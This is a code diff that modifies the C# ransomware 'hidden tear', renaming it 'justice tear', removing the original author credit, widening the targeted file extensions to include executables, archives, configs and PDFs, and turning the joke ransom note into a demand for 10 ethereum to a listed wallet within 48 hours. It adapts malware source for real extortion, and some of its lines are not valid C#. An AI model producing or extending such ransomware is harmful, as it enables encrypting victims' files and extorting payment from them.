@@ -1,27 +1,11 @@
-﻿/*
- _     _     _     _              _                  
-| |   (_)   | |   | |            | |                 
-| |__  _  __| | __| | ___ _ __   | |_ ___  __ _ _ __ 
-| '_ \| |/ _` |/ _` |/ _ \ '_ \  | __/ _ \/ _` | '__|
-| | | | | (_| | (_| |  __/ | | | | ||  __/ (_| | |   
-|_| |_|_|\__,_|\__,_|\___|_| |_|  \__\___|\__,_|_|  
+﻿/*  
  
- * Coded by Utku Sen(Jani) / August 2015 Istanbul / utkusen.com 
- * hidden tear may be used only for Educational Purposes. Do not use it as a ransomware!
+ * Coded by PR / August 2015  / istanbul.com 
+ * justice tear may be used only for Educational Purposes. Do not use it as a ransomware!
  * You could go to jail on obstruction of justice charges just for running hidden tear, even though you are innocent.
  * 
- * Ve durdu saatler 
- * Susuyor seni zaman
- * Sesin dondu kulagimda
- * Dedi uykudan uyan
  * 
- * Yine boyle bir aksamdi
- * Sen guluyordun ya gozlerimin icine
- * Feslegenler boy vermisti
- * Gokten parlak bir yildiz dustu pesine
- * Sakladim gozyaslarimi
- */
-
+#ok so here start the initialization of the program...
 using System;
 using System.Diagnostics;
 using System.Collections.Generic;
@@ -40,6 +24,7 @@ using Microsoft.Win32;
 using System.Runtime.InteropServices;
 using System.Text.RegularExpressions;
 
+#This is the form that shows the infected message
 
 namespace hidden_tear
 {
@@ -150,7 +135,7 @@ namespace hidden_tear
             //extensions to be encrypt
             var validExtensions = new[]
             {
-                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"
+             ".aspx", ".asp", ".config", ".zip" ".tar", ".log", ".inf", ".exe", ".pdf", ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"
             };
 
             string[] files = Directory.GetFiles(location);
@@ -185,7 +170,7 @@ namespace hidden_tear
         {
             string path = "\\Desktop\\test\\READ_IT.txt";
             string fullpath = userDir + userName + path;
-            string[] lines = { "Files has been encrypted with hidden tear", "Send me some bitcoins or kebab", "And I also hate night clubs, desserts, being drunk." };
+            string[] lines = { "All Files has been encrypted with Justice tear for security issues", "Send A payment of 10 ethereum to the followin address to recive the unlock key within 48 hours", "ethereum address to send coins to : 0x37aa3625a708b725f0e9be06810ed610c7dc6b33" };
             System.IO.File.WriteAllLines(fullpath, lines);
         }
     }
